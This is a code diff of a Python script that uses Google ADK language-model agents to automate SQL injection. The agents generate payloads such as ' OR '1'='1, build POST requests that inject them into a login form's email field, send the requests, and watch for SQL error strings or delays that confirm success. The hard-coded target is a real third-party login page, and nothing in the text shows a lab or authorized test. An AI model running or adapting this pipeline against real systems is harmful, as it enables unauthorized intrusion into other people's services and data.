@@ -264,7 +264,9 @@ from typing import Dict, Any
 from google.adk.agents import LoopAgent, LlmAgent, SequentialAgent
 from google.adk.runners import InMemoryRunner
 from google.adk.tools.tool_context import ToolContext
-from google.adk.events import EventActions
+from google.adk.events import Event, EventActions
+from google.adk.sessions import InMemorySessionService
+from google.adk.runners import Runner
 import subprocess
 import shlex
 import time
@@ -272,22 +274,77 @@ from typing import List, Dict
 from google.adk.tools.tool_context import ToolContext
 from dotenv import load_dotenv
 load_dotenv()
-
-import requests
+from google.genai import types
 import time
 from typing import Dict, Any
 from google.adk.tools.tool_context import ToolContext
+import requests
+import time
+import json
+import re
+
+def parse_json_from_state(value):
+    """Parse JSON from state value, stripping markdown code blocks if present."""
+    if value is None:
+        return None
+    
+    # If it's already a dict, return it
+    if isinstance(value, dict):
+        return value
+    
+    # If it's a string, try to parse it
+    if isinstance(value, str):
+        # Remove markdown code blocks (```json ... ``` or ``` ... ```)
+        cleaned = re.sub(r'^```(?:json)?\s*\n?', '', value, flags=re.MULTILINE)
+        cleaned = re.sub(r'\n?```\s*$', '', cleaned, flags=re.MULTILINE)
+        cleaned = cleaned.strip()
+        
+        try:
+            return json.loads(cleaned)
+        except json.JSONDecodeError:
+            # If parsing fails, try the original string
+            try:
+                return json.loads(value)
+            except json.JSONDecodeError:
+                return value
+    
+    return value
+
+def execute_attack(request_args: dict) -> dict:
+    endpoint = request_args["endpoint"]
+    method = request_args["method"]
+    data = request_args["data"]
+    print(f"Endpoint: {endpoint}")
+    print(f"Method: {method}")
+    print(f"Data: {data}")
+    start = time.time()
+
+    if method.upper() == "POST":
+        resp = requests.post(endpoint, data=data, timeout=15, allow_redirects=False)
+    else:
+        resp = requests.get(endpoint, params=data, timeout=15, allow_redirects=False)
+    print(f"Status Code: {resp.status_code}")
+    print(f"Length: {len(resp.text)}")
+    latency = round(time.time() - start, 3)
+    body = resp.text.lower()
+
+    sql_error = any(k in body for k in [
+        "sql syntax", "mysql", "sqlite", "psql", "ora-", "syntax error"
+    ])
+
+    return {
+        "status": resp.status_code,
+        "length": len(resp.text),
+        "latency": latency,
+        "sql_error": sql_error
+    }
 
 
-def http_request(
-    endpoint: str,
-    method: str,
-    data: Dict[str, Any],
-    tool_context: ToolContext
-) -> Dict[str, Any]:
-    """
-    ADK Tool: Execute HTTP request using requests.
-    """
+
+def execute(request: dict, tool_context: ToolContext) -> dict:
+    endpoint = request["endpoint"]
+    method = request["method"]
+    data = request["data"]
 
     print("🔥 http_request TOOL INVOKED 🔥")
     print("Endpoint:", endpoint)
@@ -344,107 +401,107 @@ def http_request(
             "error": str(e)
         }
 
-def execute(curl_commands: List[str], tool_context: ToolContext) -> List[Dict]:
-    """
-    ADK Tool: Executes curl commands safely and returns structured results.
-    """
+# def execute(curl_commands: List[str], tool_context: ToolContext) -> List[Dict]:
+#     """
+#     ADK Tool: Executes curl commands safely and returns structured results.
+#     """
 
-    results = []
+#     results = []
 
-    for curl_command in curl_commands:
-        print(f"[execute] Running: {curl_command}")
+#     for curl_command in curl_commands:
+#         print(f"[execute] Running: {curl_command}")
 
-        # Basic validation
-        if not curl_command or not curl_command.strip().startswith("curl"):
-            results.append({
-                "success": False,
-                "error": "Invalid curl command",
-                "status_code": -1,
-                "latency": 0,
-                "response_length": 0,
-                "stdout": "",
-                "stderr": "",
-                "sql_error": False,
-                "timed_out": False
-            })
-            continue
+#         # Basic validation
+#         if not curl_command or not curl_command.strip().startswith("curl"):
+#             results.append({
+#                 "success": False,
+#                 "error": "Invalid curl command",
+#                 "status_code": -1,
+#                 "latency": 0,
+#                 "response_length": 0,
+#                 "stdout": "",
+#                 "stderr": "",
+#                 "sql_error": False,
+#                 "timed_out": False
+#             })
+#             continue
 
-        try:
-            args = shlex.split(curl_command)
+#         try:
+#             args = shlex.split(curl_command)
 
-            start = time.time()
-            completed = subprocess.run(
-                args,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            latency = time.time() - start
+#             start = time.time()
+#             completed = subprocess.run(
+#                 args,
+#                 capture_output=True,
+#                 text=True,
+#                 timeout=30
+#             )
+#             latency = time.time() - start
 
-            stdout = completed.stdout or ""
-            stderr = completed.stderr or ""
-            combined = (stdout + stderr).lower()
+#             stdout = completed.stdout or ""
+#             stderr = completed.stderr or ""
+#             combined = (stdout + stderr).lower()
 
-            # SQL error heuristics
-            sql_error_keywords = [
-                "sql syntax",
-                "mysql",
-                "psql",
-                "sqlite",
-                "ora-",
-                "syntax error",
-                "unterminated",
-                "odbc",
-                "jdbc"
-            ]
+#             # SQL error heuristics
+#             sql_error_keywords = [
+#                 "sql syntax",
+#                 "mysql",
+#                 "psql",
+#                 "sqlite",
+#                 "ora-",
+#                 "syntax error",
+#                 "unterminated",
+#                 "odbc",
+#                 "jdbc"
+#             ]
 
-            sql_error = any(k in combined for k in sql_error_keywords)
+#             sql_error = any(k in combined for k in sql_error_keywords)
 
-            results.append({
-                "success": completed.returncode == 0,
-                "status_code": completed.returncode,
-                "latency": round(latency, 3),
-                "response_length": len(stdout),
-                "stdout": stdout[:2000],   # cap for safety
-                "stderr": stderr[:2000],
-                "sql_error": sql_error,
-                "timed_out": False
-            })
+#             results.append({
+#                 "success": completed.returncode == 0,
+#                 "status_code": completed.returncode,
+#                 "latency": round(latency, 3),
+#                 "response_length": len(stdout),
+#                 "stdout": stdout[:2000],   # cap for safety
+#                 "stderr": stderr[:2000],
+#                 "sql_error": sql_error,
+#                 "timed_out": False
+#             })
 
-        except subprocess.TimeoutExpired:
-            results.append({
-                "success": False,
-                "status_code": -1,
-                "latency": 30,
-                "response_length": 0,
-                "stdout": "",
-                "stderr": "Command timed out",
-                "sql_error": False,
-                "timed_out": True
-            })
+#         except subprocess.TimeoutExpired:
+#             results.append({
+#                 "success": False,
+#                 "status_code": -1,
+#                 "latency": 30,
+#                 "response_length": 0,
+#                 "stdout": "",
+#                 "stderr": "Command timed out",
+#                 "sql_error": False,
+#                 "timed_out": True
+#             })
 
-        except Exception as e:
-            results.append({
-                "success": False,
-                "status_code": -1,
-                "latency": 0,
-                "response_length": 0,
-                "stdout": "",
-                "stderr": str(e),
-                "sql_error": False,
-                "timed_out": False
-            })
+#         except Exception as e:
+#             results.append({
+#                 "success": False,
+#                 "status_code": -1,
+#                 "latency": 0,
+#                 "response_length": 0,
+#                 "stdout": "",
+#                 "stderr": str(e),
+#                 "sql_error": False,
+#                 "timed_out": False
+#             })
 
-    return results
+#     return results
 
 
 # -------------------------------------------------------------------
 # Constants
 # -------------------------------------------------------------------
 
-APP_NAME = "sql_injection_loop_app"
+APP_NAME = "agents"
 USER_ID = "dev_user_01"
-SESSION_ID = "sql_loop_session_001"
+SESSION_ID = "agents"
 GEMINI_MODEL = "gemma-3-1b-it"
 
 # -------------------------------------------------------------------
@@ -473,59 +530,60 @@ def exit_loop(tool_context: ToolContext):
 # -------------------------------------------------------------------
 # SQL Payload Generator Agent
 # -------------------------------------------------------------------
-state_init_agent = LlmAgent(
-    name="StateInitAgent",
-    model=GEMINI_MODEL,
-    include_contents="none",
-    instruction="""
-Initialize loop state from Web input.
+# state_init_agent = LlmAgent(
+#     name="StateInitAgent",
+#     model=GEMINI_MODEL,
+#     include_contents="none",
+#     instruction="""
+# Initialize loop state from Web input.
 
-Return EXACTLY this JSON:
-{
-  "endpoint": "{{input.endpoint}}",
-  "field": "{{input.field}}"
-}
-""",
-    output_key="__state__",   # 👈 THIS IS THE KEY
-    description="Writes endpoint and field into ADK state"
-)
-endpoint_init_agent = LlmAgent(
-    name="EndpointInitAgent",
-    model=GEMINI_MODEL,
-    include_contents="none",
-    instruction="""
-Read endpoint from Web input and output it verbatim.
+# Return EXACTLY this JSON:
+# {
+#   "endpoint": "{{input.endpoint}}",
+#   "field": "{{input.field}}"
+# }
+# """,
+#     output_key="__state__",   # 👈 THIS IS THE KEY
+#     description="Writes endpoint and field into ADK state"
+# )
+# endpoint_init_agent = LlmAgent(
+#     name="EndpointInitAgent",
+#     model=GEMINI_MODEL,
+#     include_contents="none",
+#     instruction="""
+# Read endpoint from Web input and output it verbatim.
 
-Endpoint: {{input.endpoint}}
+# Endpoint: {{input.endpoint}}
 
-Output ONLY the endpoint string.
-""",
-    output_key="endpoint"
-)
-field_init_agent = LlmAgent(
-    name="FieldInitAgent",
-    model=GEMINI_MODEL,
-    include_contents="none",
-    instruction="""
-Read field from Web input and output it verbatim.
+# Output ONLY the endpoint string.
+# """,
+#     output_key="endpoint"
+# )
+# field_init_agent = LlmAgent(
+#     name="FieldInitAgent",
+#     model=GEMINI_MODEL,
+#     include_contents="none",
+#     instruction="""
+# Read field from Web input and output it verbatim.
 
-Field: {{input.field}}
+# Field: {{input.field}}
 
-Output ONLY the field string.
-""",
-    output_key="field"
-)
-feedback_init_agent = LlmAgent(
-    name="FeedbackInitAgent",
-    model=GEMINI_MODEL,
-    include_contents="none",
-    instruction="""
-Initialize feedback state.
+# Output ONLY the field string.
+# """,
+#     output_key="field"
+# )
+# feedback_init_agent = LlmAgent(
+#     name="FeedbackInitAgent",
+#     model=GEMINI_MODEL,
+#     include_contents="none",
+#     instruction="""
+# Initialize feedback state.
 
-Output an empty JSON object.
-""",
-    output_key="feedback"
-)
+# Output an empty JSON object.
+# """,
+#     output_key="feedback"
+# )
+
 form_init_agent = LlmAgent(
     name="FormInitAgent",
     model=GEMINI_MODEL,
@@ -533,16 +591,22 @@ form_init_agent = LlmAgent(
     instruction="""
 You are initializing form context for an attack agent.
 
-Read the form info from Web input and output EXACTLY this JSON:
+The user message contains a JSON string with form information.
+Parse the JSON from the user's message and output EXACTLY this JSON structure:
 
 {
-  "endpoint": "{{input.action}}",
-  "method": "{{input.method}}",
-  "inputs": {{input.inputs}},
-  "target_field": "{{input.target_field}}"
+  "endpoint": "<value from 'action' field or 'endpoint' field>",
+  "method": "<value from 'method' field>",
+  "inputs": <value from 'inputs' field as array>,
+  "target_field": "<value from 'target_field' field>"
 }
 
-Do not explain anything.
+Rules:
+- If the input JSON has "action", use it as "endpoint"
+- If the input JSON has "endpoint", use it directly
+- Copy "method", "inputs", and "target_field" directly
+- Output ONLY the raw JSON, NO markdown code blocks, NO ```json, NO explanations
+- Just output the JSON object directly, nothing else
 """,
     output_key="form"
 )
@@ -571,7 +635,9 @@ Generate ONE SQL injection payload suitable for the target field.
 - Password field → boolean or error-based payloads
 - Ignore hidden fields
 
-Output ONLY the payload string.
+Output ONLY the raw payload string.
+CRITICAL: NO markdown, NO code blocks, NO backticks, NO ```, NO explanations.
+Just the payload text, nothing else. For example, if the payload is ' OR '1'='1, output exactly: ' OR '1'='1
 """,
     output_key="payload"
 )
@@ -627,52 +693,95 @@ Output ONLY the payload string.
 #     description="Executes SQL payloads using the execute tool and returns structured feedback.",
 #     output_key=STATE_FEEDBACK
 # )
+request_builder_agent = LlmAgent(
+    name="RequestBuilderAgent",
+    model=GEMINI_MODEL,
+    include_contents="none",
+    instruction="""
+You are building a concrete HTTP request from state.
+
+Form data:
+- Endpoint: {{form.endpoint}}
+- Method: {{form.method}}
+- Target field: {{form.target_field}}
+- All inputs: {{form.inputs}}
+
+Payload to inject: {{payload}}
+
+Task:
+Build a JSON object with the actual values from the form and payload.
+
+Example structure (use ACTUAL values, not placeholders):
+{
+  "endpoint": "https://app.coolify.io/login",
+  "method": "POST",
+  "data": {
+    "email": "' OR '1'='1",
+    "password": "test"
+  }
+}
+
+Rules:
+- Use the ACTUAL endpoint value from {{form.endpoint}}
+- Use the ACTUAL method value from {{form.method}}
+- Inject the ACTUAL payload value from {{payload}} into the field specified by {{form.target_field}}
+- Use dummy values (like "test") for other non-hidden fields
+- Output ONLY the raw JSON object, NO markdown, NO code blocks, NO ```json, NO backticks, NO explanations
+- Start with { and end with }, nothing before or after
+""",
+    output_key="request"
+)
+
 sql_attack_agent = LlmAgent(
     name="SQLAttackAgent",
     model=GEMINI_MODEL,
     include_contents="none",
-    tools=[http_request],
+    tools=[execute],
     instruction="""
-You are a SQL Attack Execution Agent.
+Call the execute(request) tool using the request object in state.
 
-THIS IS NON-NEGOTIABLE:
-- You MUST call the http_request tool.
-- You are NOT allowed to answer in text.
-- If you do not call the tool, the task is FAILED.
+request:
+{{request}}
 
-Form context:
-Endpoint: {{form.endpoint}}
-Method: {{form.method}}
-Inputs:
-{{form.inputs}}
-
-Target field:
-{{form.target_field}}
-
-Payload:
-{{payload}}
-
-Step-by-step (MANDATORY):
-1. Build a dictionary called form_data:
-   - Inject the payload ONLY into the target field
-   - Use "test" for all other non-hidden fields
-
-2. Call the http_request tool with EXACTLY:
+Rules:
+- Call the execute(request) tool with EXACTLY this argument:
 {
-  "endpoint": "{{form.endpoint}}",
-  "method": "{{form.method}}",
-  "data": form_data
+  "request": <the object above>
 }
-
-3. Do NOT generate any text.
-4. The tool response IS the final answer.
+- Do not generate text
+- Do not modify values
 """,
     output_key="feedback"
 )
 
+
 # -------------------------------------------------------------------
 # SQL Evaluator + Exit Controller Agent
 # -------------------------------------------------------------------
+
+# sql_evaluator_agent = LlmAgent(
+#     name="SQLEvaluatorAgent",
+#     model=GEMINI_MODEL,
+#     include_contents="none",
+#     tools=[exit_loop],
+#     instruction="""
+# You are a SQL Injection Evaluator.
+
+# Execution feedback:
+# {{feedback}}
+
+# Decision rules:
+# - IF sql_error == true → call exit_loop
+# - IF latency >= 4.5 seconds → call exit_loop
+# - IF HTTP status is 403 or 429 → call exit_loop
+# - ELSE → do nothing (continue loop)
+
+# IMPORTANT:
+# - If calling exit_loop, DO NOT output text.
+# - If continuing, output NOTHING.
+# """,
+#     description="Evaluates SQL attack results and decides when to exit."
+# )
 
 sql_evaluator_agent = LlmAgent(
     name="SQLEvaluatorAgent",
@@ -680,37 +789,31 @@ sql_evaluator_agent = LlmAgent(
     include_contents="none",
     tools=[exit_loop],
     instruction="""
-You are a SQL Injection Evaluator.
-
 Execution feedback:
 {{feedback}}
 
-Decision rules:
-- IF sql_error == true → call exit_loop
-- IF latency >= 4.5 seconds → call exit_loop
-- IF HTTP status is 403 or 429 → call exit_loop
-- ELSE → do nothing (continue loop)
+If sql_error == true OR latency >= 4.5:
+call exit_loop
 
-IMPORTANT:
-- If calling exit_loop, DO NOT output text.
-- If continuing, output NOTHING.
-""",
-    description="Evaluates SQL attack results and decides when to exit."
+Else do nothing.
+"""
 )
+
 
 # -------------------------------------------------------------------
 # SQL Injection Loop Agent
 # -------------------------------------------------------------------
 
-sql_loop_agent = LoopAgent(
-    name="SQLInjectionLoop",
-    sub_agents=[
-        sql_payload_agent,
-        sql_attack_agent,
-        sql_evaluator_agent
-    ],
-    max_iterations=2
-)
+# sql_loop_agent = LoopAgent(
+#     name="SQLInjectionLoop",
+#     sub_agents=[
+#         sql_payload_agent,
+#         request_builder_agent,
+#         # sql_attack_agent,
+#         sql_evaluator_agent
+#     ],
+#     max_iterations=2
+# )
 
 # -------------------------------------------------------------------
 # Root Sequential Agent (required name: root_agent)
@@ -736,35 +839,141 @@ sql_loop_agent = LoopAgent(
 root_agent = SequentialAgent(
     name="SQLInjectionPipeline",
     sub_agents=[
-        form_init_agent,     # writes state.form
-        sql_loop_agent       # payload agent can now read {{form.*}}
+        sql_payload_agent,      # payload agent reads {{form.*}} from state
+        request_builder_agent,
     ]
 )
-
-
-
 # -------------------------------------------------------------------
 # Runner
 # -------------------------------------------------------------------
 
+from google.genai import types
+
 async def run():
-    runner = InMemoryRunner(
+    session_service = InMemorySessionService()
+    # Create session - must await since it's async
+    session = await session_service.create_session(
         app_name=APP_NAME,
-        agent=root_agent
+        user_id=USER_ID,
+        session_id=SESSION_ID
+    )
+    print(f"Created session: {session}")
+    
+    runner = Runner(
+        agent=root_agent,
+        app_name=APP_NAME,
+        session_service=session_service
+    )
+    session_id = SESSION_ID
+    print(f"Using session_id: {session_id}")
+    
+    # Set form data directly in state using Event and EventActions
+    form_data = {
+        "endpoint": "app.coolify.io/login",
+        "method": "POST",
+        "inputs": [
+            {"name": "_token", "type": "hidden"},
+            {"name": "email", "type": "email"},
+            {"name": "password", "type": "password"}
+        ],
+        "target_field": "email"
+    }
+    
+    # Update state with form data using Event/EventActions (proper ADK way)
+    form_state_changes = {
+        "form": form_data
+    }
+    
+    form_actions = EventActions(state_delta=form_state_changes)
+    form_event = Event(
+        author="system",
+        actions=form_actions
+    )
+    
+    await session_service.append_event(session, form_event)
+    print(f"State after setting form: {session.state}")
+    
+    # ---------- Phase 1: planning ----------
+    # Run the agent pipeline - agents can access {{form.*}} from state
+    async for _ in runner.run_async(
+        user_id=USER_ID,
+        session_id=session_id,
+        new_message=types.Content(
+            role="user",
+            parts=[types.Part(text="Start SQL injection testing")]
+        )
+    ):
+        pass
+    
+    # Get the session again to access updated state after agent run
+    session = await session_service.get_session(
+        app_name=APP_NAME,
+        user_id=USER_ID,
+        session_id=session_id
+    )
+    print(f"State after agent run: {session.state}")
+    # ---------- Phase 2: Python execution ----------
+    # Get request from state (set by request_builder_agent with output_key="request")
+    state = session.state
+    request_raw = state.get("request")
+    
+    # Parse JSON from state, stripping markdown code blocks if present
+    request_args = parse_json_from_state(request_raw)
+    print(f"Request args (parsed): {request_args}")
+    
+    if not request_args:
+        raise ValueError("Request not found in state. Make sure the agent pipeline completed successfully.")
+    
+    if not isinstance(request_args, dict):
+        raise ValueError(f"Request args must be a dict, got {type(request_args)}: {request_args}")
+    
+    feedback = execute_attack(request_args)
+    print(f"Feedback: {feedback}")
+    
+    # Get the session to update state
+    session = await session_service.get_session(
+        app_name=APP_NAME,
+        user_id=USER_ID,
+        session_id=session_id
+    )
+    print(f"State after agent run: {session.state}")
+    
+    # Update state using Event and EventActions (proper ADK way)
+    state_changes = {
+        "feedback": feedback
+    }
+    
+    actions_with_update = EventActions(state_delta=state_changes)
+    system_event = Event(
+        author="system",
+        actions=actions_with_update
+    )
+    
+    await session_service.append_event(session, system_event)
+    print(f"State after adding feedback: {session.state}")
+    runner2= Runner(
+        agent=sql_evaluator_agent,
+        app_name=APP_NAME,
+        session_service=session_service
     )
 
-    async for event in runner.run_async(
+    # ---------- Phase 3: evaluation ----------
+    async for event in runner2.run_async(
         user_id=USER_ID,
-        session_id=SESSION_ID,
-        input={
-            STATE_ENDPOINT: "http://target.com/login",
-            STATE_FIELD: "email",
-            STATE_FEEDBACK: ""
-        }
+        session_id=session_id,
+        new_message=types.Content(
+            role="user",
+            parts=[
+                types.Part(text=str({
+                    "feedback": feedback
+                }))
+            ]
+        )
     ):
         if event.actions == EventActions.ESCALATE:
-            print("✅ SQL Injection loop exited cleanly")
+            print("✅ SQLi confirmed or loop stopped")
             break
+
 
 if __name__ == "__main__":
     asyncio.run(run())
